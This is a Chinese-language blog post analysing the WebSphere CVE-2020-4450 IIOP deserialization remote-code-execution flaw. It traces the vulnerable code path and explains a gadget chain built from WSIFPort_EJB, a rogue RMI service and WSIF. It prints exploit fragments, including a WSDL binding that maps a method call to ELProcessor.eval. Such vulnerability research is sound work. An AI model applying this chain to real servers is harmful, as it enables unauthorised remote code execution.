
 <!DOCTYPE HTML>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  
    <title>WebSphere CVE-2020-4450 漏洞分析 | 随风&#39;S Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="iswin">
    

    
    <meta name="description" content="漏洞简介 7月20号，ZDI官方Blog公布了一个名为abusing-java-remote-protocols-in-ibm-websphere 的文章，文章中提到了Websphere的两个漏洞，一个是RCE，另外一个是XXE，根据Blog中的内容来看，漏洞属于IIOP协议的反序列化，也是基于JNDI的利用，但是跟常规的JNDI利用有一些不同之处，一方面是Websphere将IIOP替换成自己的">
<meta name="keywords" content="Deserialize,JAVA">
<meta property="og:type" content="article">
<meta property="og:title" content="WebSphere CVE-2020-4450 漏洞分析">
<meta property="og:url" content="https://www.iswin.org/2020/08/04/WebSphere-CVE-2020-4450-Vul-Analysis/index.html">
<meta property="og:site_name" content="随风&#39;S Blog">
<meta property="og:description" content="漏洞简介 7月20号，ZDI官方Blog公布了一个名为abusing-java-remote-protocols-in-ibm-websphere 的文章，文章中提到了Websphere的两个漏洞，一个是RCE，另外一个是XXE，根据Blog中的内容来看，漏洞属于IIOP协议的反序列化，也是基于JNDI的利用，但是跟常规的JNDI利用有一些不同之处，一方面是Websphere将IIOP替换成自己的">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://www.iswin.org/attach/online-repo.png">
<meta property="og:image" content="https://www.iswin.org/attach/online-repo-ready.png">
<meta property="og:image" content="https://www.iswin.org/attach/TxServerInterceptor_receive_request.png">
<meta property="og:image" content="https://www.iswin.org/attach/InterceptorManager_iterateServerInterceptors.png">
<meta property="og:image" content="https://www.iswin.org/attach/TxServerInterceptor_demarshalContext.png">
<meta property="og:image" content="https://www.iswin.org/attach/payload_serviceContext.png">
<meta property="og:image" content="https://www.iswin.org/attach/TxInterceptorHelper_demarshalContext_serviceContext.png">
<meta property="og:image" content="https://www.iswin.org/attach/inputstream_read_any.png">
<meta property="og:image" content="https://www.iswin.org/attach/payload_generate.png">
<meta property="og:image" content="https://www.iswin.org/attach/getEJBObject.png">
<meta property="og:image" content="https://www.iswin.org/attach/obj_factory.png">
<meta property="og:image" content="https://www.iswin.org/attach/WSIFServiceObjectFactory_getObjectInstance.png">
<meta property="og:image" content="https://www.iswin.org/attach/rmi_server.png">
<meta property="og:image" content="https://www.iswin.org/attach/EJSWrapper_handler.png">
<meta property="og:image" content="https://www.iswin.org/attach/8.5.5.0_bug.png">
<meta property="og:image" content="https://www.iswin.org/attach/bugs_002.png">
<meta property="og:image" content="https://www.iswin.org/attach/factory_001.png">
<meta property="og:image" content="https://www.iswin.org/attach/image-20200731130143041.png">
<meta property="og:image" content="https://www.iswin.org/attach/444444.png">
<meta property="og:image" content="https://www.iswin.org/attach/11111.png">
<meta property="og:image" content="https://www.iswin.org/attach/2222222.png">
<meta property="og:updated_time" content="2020-08-04T05:36:50.167Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="WebSphere CVE-2020-4450 漏洞分析">
<meta name="twitter:description" content="漏洞简介 7月20号，ZDI官方Blog公布了一个名为abusing-java-remote-protocols-in-ibm-websphere 的文章，文章中提到了Websphere的两个漏洞，一个是RCE，另外一个是XXE，根据Blog中的内容来看，漏洞属于IIOP协议的反序列化，也是基于JNDI的利用，但是跟常规的JNDI利用有一些不同之处，一方面是Websphere将IIOP替换成自己的">
<meta name="twitter:image" content="https://www.iswin.org/attach/online-repo.png">

    
    <link rel="alternative" href="/atom.xml" title="随风&#39;S Blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/author.jpg" alt="随风&#39;S Blog" title="随风&#39;S Blog"/></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="随风&#39;S Blog">随风&#39;S Blog</a></h1>
				<h2 class="blog-motto">网络安全爱好者</h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
						<li><a href="/atom.xml">RSS</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:www.iswin.org">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2020/08/04/WebSphere-CVE-2020-4450-Vul-Analysis/" title="WebSphere CVE-2020-4450 漏洞分析" itemprop="url">WebSphere CVE-2020-4450 漏洞分析</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="iswin" target="_blank" itemprop="author">iswin</a>
		
  <p class="article-time">
    <time datetime="2020-08-04T05:08:35.000Z" itemprop="datePublished"> 发表于 2020-08-04</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">文章目录</strong>
		
			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞环境准备"><span class="toc-number">2.</span> <span class="toc-text">漏洞环境准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
		
		</div>
		
		<h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><blockquote>
<p>7月20号，ZDI官方Blog公布了一个名为<a href="https://www.thezdi.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere" target="_blank" rel="noopener">abusing-java-remote-protocols-in-ibm-websphere</a> 的文章，文章中提到了Websphere的两个漏洞，一个是RCE，另外一个是XXE，根据Blog中的内容来看，漏洞属于IIOP协议的反序列化，也是基于JNDI的利用，但是跟常规的JNDI利用有一些不同之处，一方面是Websphere将IIOP替换成自己的实现，另外就是Websphere严格的类加载机制导致大部分公开的利用链都没法利用，这个漏洞利用需要访问至少2809端口以及两次外连请求，从红队利用角度来看稍微有点鸡肋，但是漏洞的利用思路以及EXP的构造都非常的有意思，是一个值得研究的漏洞。</p>
</blockquote>
<h3 id="漏洞环境准备"><a href="#漏洞环境准备" class="headerlink" title="漏洞环境准备"></a>漏洞环境准备</h3><p>经常做分析的同学都有深刻体会，针对有些不了解、不熟悉的系统进行分析时往往在环境准备上会耗费大量时间，而且有部分漏洞的利用需要在特定的条件和环境下进行，经常是”环境准备1天，分析调试10分钟“。</p>
<p>Websphere的安装有两种方式：</p>
<ol>
<li>在线安装，直接在<a href="https://www.ibm.com/support/pages/installation-manager-and-packaging-utility-download-documents下载Installation" target="_blank" rel="noopener">https://www.ibm.com/support/pages/installation-manager-and-packaging-utility-download-documents下载Installation</a> Manager工具就可以在线安装，国内的网速环境比较慢，需要挂代理然后多刷新几次，直到出来以下界面，说明就OK了。</li>
</ol>
<p><img src="https://www.iswin.org/attach/online-repo.png" alt></p>
<p><img src="https://www.iswin.org/attach/online-repo-ready.png" alt></p>
<ol>
<li>离线安装，这种方式现在官方基本上不推荐，而且离线的安装包基本上都是8.X的相对来说比较老，离线安装基本上需要将低包和安装程序都全部下载下来。</li>
</ol>
<p><strong>注</strong>：尽量不要选择基于Docker的安装环境，JAVA大部分RMI通信会依赖其他端口（一般是高端口）进行通信，安装的时候一定不要选补丁，不然复现不了，在线安装的版本是自带补丁的版本，本次测试的环境主要覆盖了两个版本，8.5.5.0以及9.0.0.2版本，这两个版本基本上涵盖了主流的版本。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>一般情况下调试之前我们要看下端口对应是哪些进程启动，然后给对用的进程加上远程Remote Debug选项，Websphere的远程调试直接在后台对应Application Server下面设置Remote Debug就可（2809的端口以及其它几个端口PID都一样），Websphere之前没有针对性的看过，根据官方的描述我们直接将断点打在com.ibm.ws.Transaction.JTS.TxServerInterceptor#receive_request上，然后用IIOP客户端直接连接，触发断点之后，就可以在堆栈里面看到完整请求的触发路径。</p>
<p><img src="https://www.iswin.org/attach/TxServerInterceptor_receive_request.png" alt></p>
<p>这个回溯的时候我们可以看一下这个漏洞触发点的位置，由于这个点是未授权，所以我们通过回溯可以看一下整体的流程，这个点的Interceptor就类似Java WEB中Filter的功能，回溯到com.ibm.rmi.pi.InterceptorManager#iterateServerInterceptors，可以看到还有一些其他的拦截器</p>
<p><img src="https://www.iswin.org/attach/InterceptorManager_iterateServerInterceptors.png" alt></p>
<p>这些点都可以有助于分析人员对系统框架设计上的一些了解，下来直接看到关键的触发点，我们需要首先解决的问题是如何能到达漏洞触发点</p>
<p><img src="https://www.iswin.org/attach/TxServerInterceptor_demarshalContext.png" alt></p>
<p>我们的目标是进入TxInterceptorHelper.demarshalContext方法，那么这里核心的点就是保证ServiceContext serviceContext = ((ExtendedServerRequestInfo)sri).getRequestServiceContext(0);代码片段中中serviceContext不为空，同时serviceContext.context_data的内容不为空，所以我们先解决如何构造数据包的问题。</p>
<p>IIOP协议的链接主要有两种方式,一种是JAVA提供的标准客户端连接方式，这个的好处是可以通过设置java.naming.factory.initial对应的实现类去处理多种协议，例如T3(S)/IIOP(S)/LDAP(S)等等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.ibm.websphere.naming.WsnInitialContextFactory"</span>);</span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">"iiop://192.168.18.130:2809"</span>);</span><br><span class="line">InitialContext initialContext = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">initialContext.list(<span class="string">"sglab"</span>);</span><br></pre></td></tr></table></figure>
<p>另外一种就是用ORB客户端直接连接，这种相对来说比较直接一点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">props.put(<span class="string">"org.omg.CORBA.ORBInitialPort"</span>, <span class="string">"2809"</span>);</span><br><span class="line">props.put(<span class="string">"org.omg.CORBA.ORBInitialHost"</span>, <span class="string">"192.168.18.130"</span>);</span><br><span class="line">ORB orb = ORB.init(args, props);</span><br><span class="line">org.omg.CORBA.Object orbref = orb.resolve_initial_references(<span class="string">"NameService"</span>);</span><br></pre></td></tr></table></figure>
<p>现在的问题是如何在连接过程中设置相应的ServiceContext内容，经过一番搜索，发现可以通过第一种连接方式然后反射手动去加一个ServiceContext的实例，这里直接给出相应的实现，具体怎么找还是去Debug看变量。</p>
<p><img src="https://www.iswin.org/attach/payload_serviceContext.png" alt></p>
<p>现在可以到漏洞触发点了</p>
<p><img src="https://www.iswin.org/attach/TxInterceptorHelper_demarshalContext_serviceContext.png" alt></p>
<p>下面主要是看如何进行数据包的构造，为了能触发反序列化，程序必须得执行到如下代码片段第80行，propContext.implementation_specific_data = inputStream.read_any(); 代码片段。</p>
<p><img src="https://www.iswin.org/attach/inputstream_read_any.png" alt="image-20200731114459835"></p>
<p>由于前面有一堆的read*操作在demarshalContext函数中，那么我们可以看下对应marshalContext函数是怎么把对象序列化并且包装发出去的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] marshalContext(PropagationContext propContext, ORB orb) &#123;</span><br><span class="line">    <span class="keyword">if</span> (TraceComponent.isAnyTracingEnabled() &amp;&amp; tc.isEntryEnabled()) &#123;</span><br><span class="line">        Tr.entry(tc, <span class="string">"marshalContext"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">null</span>;</span><br><span class="line">    CDROutputStream outputStream = ORB.createCDROutputStream(orb);</span><br><span class="line">    outputStream.putEndian();</span><br><span class="line">    PropagationContextHelper.write(outputStream, propContext);</span><br><span class="line">    <span class="keyword">byte</span>[] result = outputStream.toByteArray();</span><br><span class="line">    outputStream.releaseBuffer();</span><br><span class="line">    <span class="keyword">if</span> (TraceComponent.isAnyTracingEnabled() &amp;&amp; tc.isEntryEnabled()) &#123;</span><br><span class="line">        Tr.exit(tc, <span class="string">"marshalContext"</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>到这里就可以照猫画虎生成payload，具体的代码片段如下<br><img src="https://www.iswin.org/attach/payload_generate.png" alt="image-20200731115005287"><br>这里WSIFPort_EJB对象在反序列化的时候回去调用一个对象fieldEjbObject，这个对象的构造稍微麻烦点，我是直接重写了com.ibm.ejs.container.EJSWrapper#getHandle函数，这样所有的构造都有可以在这里面进行，后面会讲到如何进行构造，到目前我们可以进行到反序列化的点，整体的调用链如下（主要是前面提到的inputStream.read_any()到最后调用的函数）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">513</span>, WSIFPort_EJB (org.apache.wsif.providers.ejb)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">90</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">55</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">508</span>, Method (java.lang.reflect)</span><br><span class="line">invokeObjectReader:<span class="number">2483</span>, IIOPInputStream (com.ibm.rmi.io)</span><br><span class="line">inputObjectUsingClassDesc:<span class="number">2010</span>, IIOPInputStream (com.ibm.rmi.io)</span><br><span class="line">continueSimpleReadObject:<span class="number">749</span>, IIOPInputStream (com.ibm.rmi.io)</span><br><span class="line">simpleReadObjectLoop:<span class="number">720</span>, IIOPInputStream (com.ibm.rmi.io)</span><br><span class="line">simpleReadObject:<span class="number">669</span>, IIOPInputStream (com.ibm.rmi.io)</span><br><span class="line">readValue:<span class="number">193</span>, ValueHandlerImpl (com.ibm.rmi.io)</span><br><span class="line">read_value:<span class="number">787</span>, CDRReader (com.ibm.rmi.iiop)</span><br><span class="line">read_value:<span class="number">847</span>, EncoderInputStream (com.ibm.rmi.iiop)</span><br><span class="line">unmarshalIn:<span class="number">273</span>, TCUtility (com.ibm.rmi.corba)</span><br><span class="line">read_value:<span class="number">664</span>, AnyImpl (com.ibm.rmi.corba)</span><br><span class="line">read_any:<span class="number">467</span>, CDRReader (com.ibm.rmi.iiop)</span><br><span class="line">read_any:<span class="number">797</span>, EncoderInputStream (com.ibm.rmi.iiop)</span><br><span class="line">demarshalContext:<span class="number">171</span>, TxInterceptorHelper (com.ibm.ws.Transaction.JTS)</span><br><span class="line">receive_request:<span class="number">180</span>, TxServerInterceptor (com.ibm.ws.Transaction.JTS)</span><br><span class="line">invokeInterceptor:<span class="number">608</span>, InterceptorManager (com.ibm.rmi.pi)</span><br><span class="line">iterateServerInterceptors:<span class="number">521</span>, InterceptorManager (com.ibm.rmi.pi)</span><br><span class="line">iterateReceiveRequest:<span class="number">732</span>, InterceptorManager (com.ibm.rmi.pi)</span><br><span class="line">dispatchInvokeHandler:<span class="number">629</span>, ServerDelegate (com.ibm.CORBA.iiop)</span><br><span class="line">dispatch:<span class="number">508</span>, ServerDelegate (com.ibm.CORBA.iiop)</span><br><span class="line">process:<span class="number">613</span>, ORB (com.ibm.rmi.iiop)</span><br><span class="line">process:<span class="number">1584</span>, ORB (com.ibm.CORBA.iiop)</span><br><span class="line">doRequestWork:<span class="number">3210</span>, Connection (com.ibm.rmi.iiop)</span><br><span class="line">doWork:<span class="number">3071</span>, Connection (com.ibm.rmi.iiop)</span><br><span class="line">doWork:<span class="number">64</span>, WorkUnitImpl (com.ibm.rmi.iiop)</span><br><span class="line">run:<span class="number">118</span>, PooledThread (com.ibm.ejs.oa.pool)</span><br><span class="line">run:<span class="number">1892</span>, ThreadPool$Worker (com.ibm.ws.util)</span><br></pre></td></tr></table></figure></p>
<p>这里解决了触发反序列化的这个过程，由于IBM Wesphere自定义的Classloader干掉了一些利用链中所需要类，导致公开的利用链是打不死的，所以我们需要基于WSIFPort_EJB 这个类去找一个新的利用链，基于WSIFPort_EJB 最终利用点在com.ibm.ejs.container.EntityHandle#getEJBObject中的下面代码</p>
<p><img src="https://www.iswin.org/attach/getEJBObject.png" alt="image-20200731120011453"></p>
<p>92行是漏洞最终的触发点，根据这段代码我们可以看到，ctx.lookup这个函数必须是实现EJBHOME接口的类，这样才能到100行中最后去触发利用点，假定我们不继续往后面跟进，到这里我们可以找到homeClass的要求，要实现或者EJBHOME接口，同时有声明findFindByPrimaryKey方法，并且参数是Serializable类型，那么我们可以快速找到一个接口com.ibm.ws.batch.CounterHome,该接口的具体定义如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CounterHome</span> <span class="keyword">extends</span> <span class="title">EJBHome</span> </span>&#123;</span><br><span class="line">    <span class="function">Counter <span class="title">create</span><span class="params">(String var1)</span> <span class="keyword">throws</span> CreateException, RemoteException</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Counter <span class="title">findByPrimaryKey</span><span class="params">(String var1)</span> <span class="keyword">throws</span> FinderException, RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完全满足我们的需求，现在就是要去找ctx.lookup返回结果满足上面的要求的类，根据ZDI文章中的内容，这个IIOP的实现完全被IBM自己实现了一遍，所以传统的直接去LDAP或者RMI利用在这里是肯定不行的，这个地方的JNDI的调用逻辑主要如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">com.sun.jndi.rmi.registry.RegistryContext#lookup </span><br><span class="line">com.sun.jndi.rmi.registry.RegistryContext#decodeObject </span><br><span class="line">javax.naming.spi.NamingManager#getObjectInstance </span><br><span class="line">org.apache.aries.jndi.OSGiObjectFactoryBuilder#getObjectInstance </span><br><span class="line">org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstance </span><br><span class="line">org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstanceViaContextDotObjectFactories（其他函数路径也可以）</span><br></pre></td></tr></table></figure>
<p>我们直接跟进进行进一步分析，重点看org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstance这个函数，JNDI的利用包括RMI的那个BYPASS基本上都在找javax.naming.spi.ObjectFactory接口新的实现类</p>
<p><img src="https://www.iswin.org/attach/obj_factory.png" alt="image-20200731121708555"></p>
<p>这里可以看到我们可以指定String factories = (String)environment.get(“java.naming.factory.object”);这个变量，environment变量是我们在反序列化的时候控制的内容，所以这里需要去找一个ObjectFactory可以利用的实现类，可以找到ZDI文章中说的这个org.apache.wsif.naming.WSIFServiceObjectFactory这个类，这个类我们可以看到</p>
<p><img src="https://www.iswin.org/attach/WSIFServiceObjectFactory_getObjectInstance.png" alt="image-20200731122115770"></p>
<p>到这里不由得让我们想起了之前那个RMIBYPASS的场景<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a> ，倒着我们就可以自定义一个RMI服务，将bind的内容设置成我们可以控制的org.apache.wsif.naming.WSIFServiceStubRef类型，就可以到最下面的函数，为什么上面那个org.apache.wsif.naming.WSIFServiceRef不行，因为前面提到了这个类必须要是EJBHOME的实现类，上面的明显不符合要求，下面的是通过动态代理来生成一个指定接口的类，而且接口的类型我们也可以控制，所以接下来就是如何利用wsif服务来进行代码执行了。</p>
<p>这里ctx.lookup里面的jndi的地址可以设置为自定义rmi的服务，具体的RMI服务代码如下</p>
<p><img src="https://www.iswin.org/attach/rmi_server.png" alt="image-20200731122943370"></p>
<p>这里就可以控制wsif相关的内容以及className接口的名称这里可以在设置Reference ref = new Reference(WSIFServiceStubRef.class.getName(), (String)null, (String)null);来指定具体的实现，配合org.apache.wsif.providers.ejb.WSIFPort_EJB序列化中java.naming.factory.object的类型来指定factory的实现类，也可以直接在这里指定factory的实现类这样客户端就不需要指定，两种方式都可以。</p>
<p>WSIFPort_EJB中fieldEjbObject对象的生成内容如下（我手动覆盖了com.ibm.ejs.container.EJSWrapper#getHandle）函数</p>
<p><img src="https://www.iswin.org/attach/EJSWrapper_handler.png" alt="image-20200731123434018"></p>
<p>关于WSIF服务如何进行RCE，这里说下关键点，具体的Sample参考<a href="https://www.ibm.com/support/knowledgecenter/ru/SSAW57_8.5.5/com.ibm.websphere.nd.multiplatform.doc/ae/twsf_devwes.html，看完弄个EXP肯定是没问题，factory返回的对象是一个动态代理，实现了com.ibm.ws.batch.CounterHome接口，最终在调用findByPrimaryKey函数的时候回去调用org.apache.wsif.base.WSIFClientProxy#invoke方法，这个方法中使用了WSIFOperation" target="_blank" rel="noopener">https://www.ibm.com/support/knowledgecenter/ru/SSAW57_8.5.5/com.ibm.websphere.nd.multiplatform.doc/ae/twsf_devwes.html，看完弄个EXP肯定是没问题，factory返回的对象是一个动态代理，实现了com.ibm.ws.batch.CounterHome接口，最终在调用findByPrimaryKey函数的时候回去调用org.apache.wsif.base.WSIFClientProxy#invoke方法，这个方法中使用了WSIFOperation</a> wsifOperation = this.wsifport.createOperation(method.getName(), inputName, outputName); 函数去请求wsif服务进行远程方法调用。</p>
<p>WSIF服务的wsdl描述文件中提供了JavaBind的方式，可以将描述文件中定义的函数（operation name）映射成客户机器中Java类的函数，所以这里我们可以将在wsif描述文件中定义findByPrimaryKey函数以及映射函数的参数和返回类型，这样在最终调用findByPrimaryKey函数的时候会调用到org.apache.wsif.base.WSIFClientProxy#invoke中createOperation函数去进行远程方法调用，客户端在拿到映射后就可以去执行映射类相应的函数了。</p>
<p>这里映射的类和函数是javax.el.ELProcessor类的eval方法，eval函数接受一个String类型的参数映射是符合相应的定义，WSIF对应的XML文件关键片段如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">binding</span> <span class="attr">name</span>=<span class="string">"JavaBinding"</span> <span class="attr">type</span>=<span class="string">"tns:RceServicePT"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java:binding</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">format:typeMapping</span> <span class="attr">encoding</span>=<span class="string">"Java"</span> <span class="attr">style</span>=<span class="string">"Java"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">format:typeMap</span> <span class="attr">typeName</span>=<span class="string">"xsd:string"</span> <span class="attr">formatType</span>=<span class="string">"java.lang.String"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">format:typeMap</span> <span class="attr">typeName</span>=<span class="string">"xsd:object"</span> <span class="attr">formatType</span>=<span class="string">"java.lang.Object"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">format:typeMapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">operation</span> <span class="attr">name</span>=<span class="string">"findByPrimaryKey"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java:operation</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">methodName</span>=<span class="string">"eval"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">parameterOrder</span>=<span class="string">"expression"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">methodType</span>=<span class="string">"instance"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">returnPart</span>=<span class="string">"result"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"getExpressionRequest"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">output</span> <span class="attr">name</span>=<span class="string">"getExpressionResponse"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">operation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">"rce_service"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">port</span> <span class="attr">name</span>=<span class="string">"JavaPort"</span> <span class="attr">binding</span>=<span class="string">"tns:JavaBinding"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java:address</span> <span class="attr">className</span>=<span class="string">"javax.el.ELProcessor"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>而且findByPrimaryKey的参数也是我们在WSIFPort_EJB序列化数据中可以控制的，所以最终就导致了RCE。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>最开始在测试Websphere 8.5.5.0的时候，发现有个关键位置</p>
<p><img src="https://www.iswin.org/attach/8.5.5.0_bug.png" alt="image-20200731125150155"></p>
<p>这里获取到Proxy的代理对象result的时候默认就调用ObjectFactoryHelper.logger.log(Level.FINE, “result = “ + result);方法，这个函数会导致调用Proxy代理对象的toString方法，间接的调用org.apache.wsif.base.WSIFClientProxy#invoke方法，org.apache.wsif.base.WSIFClientProxy#invoke方法中有个非常关键的函数（this.findMatchingOperation(method, args);）会导致EXP利用中断，如下图</p>
<p><img src="https://www.iswin.org/attach/bugs_002.png" alt="image-20200731125517931"></p>
<p>这里要求调用的函数必须是继承接口（EJBHOME）中一个接口，否则程序主动抛异常（Exception in thread “main” java.lang.reflect.UndeclaredThrowableException）EXP就利用失败，这个点遇到的问题卡了我两天左右，最后看到有人复现成功，测试的9版本，所以我就切换到9版本。</p>
<p>在9版本中修复了这个第三方库的BUG，不主动的调用Log，加了if判断，如下</p>
<p>9.0 版本中org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstanceViaContextDotObjectFactories函数的实现</p>
<p><img src="https://www.iswin.org/attach/factory_001.png" alt="image-20200731125956711"></p>
<p>8.5.5.0 中的org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstanceViaContextDotObjectFactories实现</p>
<p><img src="https://www.iswin.org/attach/image-20200731130143041.png" alt="image-20200731130143041"></p>
<p>很明显加了判断，就没这个问题了。</p>
<p>所以8.5.5.0默认情况下有可能打不死（如果不打补丁2013年的那个库之前），9.0.0.2 没问题，其他版本后续慢慢测试。</p>
<p>补个成功截图</p>
<p><img src="https://www.iswin.org/attach/444444.png" alt="image-20200731130504122"></p>
